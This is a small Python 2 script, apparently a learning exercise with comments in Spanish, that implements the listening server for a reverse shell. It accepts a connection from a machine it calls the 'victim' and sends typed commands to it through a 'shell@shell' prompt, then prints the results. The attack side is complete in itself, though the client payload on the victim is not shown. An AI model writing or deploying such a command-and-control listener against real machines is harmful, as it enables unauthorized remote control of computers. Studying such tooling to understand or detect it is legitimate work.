#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket

def main():
	server = socket.socket() #Aqui convertimos a server en un objeto, y estamos accediendo a la clase socket del modulo socket
	server.bind(('localhost', 7777)) #Levantamos el servidor con localhost y un puerto de 7777, ya que por debajo de 1024 puertos, estan dedicados a servicios de sistemas operativos
	server.listen(1) #Aqui ponemos el servidor a la espera de conexiones

	while True:
		victima,direccion = server.accept() #Con accept, aceptamos todas las conexiones que vengan a nuestra maquina atravez del puerto que indicamos
		print('Conexión de: {}'.format(direccion))

		ver = victima.recv(1024)

		if ver == "1":
			while True:
				opcion = raw_input("shell@shell: ")
				victima.send(opcion)
				resultado = victima.recv(2048)
				print(resultado)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Saliendo...")
		exit()